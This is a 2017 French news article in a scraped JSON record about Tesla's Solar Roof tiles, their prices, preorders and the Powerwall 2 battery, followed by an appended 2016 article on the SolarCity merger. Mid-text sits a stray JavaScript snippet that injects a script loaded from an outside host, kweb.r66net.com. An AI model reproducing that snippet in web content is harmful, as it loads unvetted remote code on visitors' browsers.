{"title": "Les toits photovoltaïques d’Elon Musk bientôt disponibles en France", "newspaper": "Futura Sciences", "author": "Relaxnews", "date_publi": "12/05/2017", "content": "Le  Solar Roof  de Tesla, annoncé à l'automne dernier, sera (peut-être) commercialisé aux États-Unis cette année et en 2018 dans d'autres pays, dont la France. Le prix est élevé mais les tuiles photovoltaïques sont garanties à vie... L'ambitieux projet développé par  Tesla  de toit solaire (le  Solar Roof ) prend définitivement forme. Présenté en grande pompe par Elon Musk à l'automne 2016, il est désormais en précommande un peu partout dans le monde, y compris en France, pour des premières livraisons attendues en 2018. Son but est de rendre une maison autonome en  énergie , en alimentant sa propre batterie électrique, sans pour autant dénaturer l'esthétique originale de son toit. L'énergie accumulée dans la journée par les  tuiles   photovoltaïques  est stockée dans une ou plusieurs batteries Powerwall. Chacune de ces tuiles mesure 365 x 184 mm et est garantie pour toute la  durée  de vie de la  maison , sans limites dans le temps. Elles sont équipées de  cellules photovoltaïques  invisibles à l' œil  nu, supportent une inclinaison de 14 à 90 degrés et sont censées résister aux intempéries (impact,  vent ,  feu ...). Voir quelques caractéristiques techniques dans l'article au bas de celui-ci. Un toit solaire Tesla installé sur une maison aux États-Unis. © Tesla                               Le toit solaire Tesla : 7.000 euros la batterie et 220 euros le mètre carré Les tuiles sont fabriquées en  verre  trempé et proposées en quatre  styles  différents : texturé, lisse, toscane et  ardoise . Tesla évoque un premier prix à 21,85 dollars le pied carré, soit près de 220 euros le m 2 . Pour ce prix, l'entreprise s'occupe de tout, du démontage du toit existant jusqu'à l'installation du toit solaire.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pour le moment, les clients tentés ne peuvent que verser un acompte de 930 euros pour pouvoir, le moment venu, débloquer la commande. Il s'agit là de la même méthode commerciale que celle employée pour la  Tesla Model 3 . Il est également possible de commander de une à dix batteries Powerwall, sachant qu'il en coûte environ 7.000 euros l'unité. Si les Français vont devoir attendre 2018 pour être livrés, de premières installations pourraient avoir lieu dans certaines régions des États-Unis avant la fin de l'année. Pour en savoir plus Énergie solaire : Tesla va vendre des toits photovoltaïques Article de  Jean-Luc Goudet  publié le 2 novembre 2016 Avec des tuiles photovoltaïques, le toit solaire de SolarCity et une nouvelle génération de batterie domestique, Powerwall 2, Elon Musk, le fondateur de Tesla, veut proposer un toit solaire capable de rendre une maison autonome en énergie. L'homme qui veut  coloniser Mars  a le sens du spectacle. Pour présenter un « toit solaire », Elon Musk a choisi les studios d'Universal, à Los Angeles (Californie), et plus précisément Wisteria Lane, le décor représentant une rue d'une petite ville américaine qui a servi à plusieurs tournages, dont ceux de la série  Desesperate housewives . L'innovation est de fabriquer des panneaux photovoltaïques faisant office de tuiles, de formes variées. Recouvertes  « de  quartz  » , elles seraient très  solides  et inusables, explique-t-il dans la  conférence de presse . Tout le toit d'une maison devient ainsi producteur d'électricité, sans nuire à l'esthétique. Car les panneaux solaires doivent suivre l'évolution des  voitures électriques  qui, longtemps,  « ressemblaient à des voiturettes de golf »  et qui sont devenues belles, sous-entendu comme les modèles de Tesla, l'entreprise dont il est président. Elon Musk présentant le toit solaire et la batterie Powerwall 2 le 28 octobre 2016. © Tesla                               Un rapprochement entre Tesla et SolarCity D'ailleurs, la conférence de presse était aussi destinée à ses actionnaires qui devront bientôt valider la  fusion  de la société avec  SolarCity , qui a créé ces tuiles photovoltaïques. Elle reste pour l'instant déficitaire et la fusion serait surtout une acquisition de Tesla. Techniquement, le rapprochement a du sens, comme l'avait déjà expliqué la firme d' Elon Musk . Les tuiles de SolarCity ne produisant de l'électricité que durant le jour, il faut la stocker pour l'utiliser une fois le  soleil  couché.  Or , Tesla présente par la même occasion la version 2 de sa batterie domestique Powerwall. D'après Elon Musk, ce nouveau modèle serait capable de stocker l'énergie produite par le toit de SolarCity installé sur une maison particulière. Le rendement d'une telle  toiture   photovoltaïque  n'est pas indiqué, ni la quantité d'électricité qu'elle est capable de produire. La batterie  Powerwall  2, vendue 5.500 dollars (un peu plus de 5.000 euros), a, d'après Tesla, une capacité de 13,5 kWh et peut alimenter une installation électrique avec une puissance de 5 kW  « et de 7 kW en pic » . Un  foyer  pourrait donc largement s'éclairer, faire fonctionner ses appareils électriques et même, peut-être, recharger sa Tesla Model S, X ou 3. La présentation n'insiste pas sur le coût de l'électricité ainsi produite mais sur les bénéfices environnementaux et la réduction des  émissions  de CO 2  alors que la teneur dans l' atmosphère , a rappelé Elon Musk dans la conférence de presse, vient de dépasser les  400 ppm  à l'échelle planétaire. Topaz, la centrale solaire géante en Californie                       Il aura fallu presque trois ans pour construire Topaz Solar Farms, la plus grande centrale électrique solaire du monde lors de son entrée en fonctionnement, en novembre 2014. Sa capacité productive est de 550 mégawatts. Découvrez en vidéo la construction de cette centrale hors du commun.                                       ", "theme": "maison"}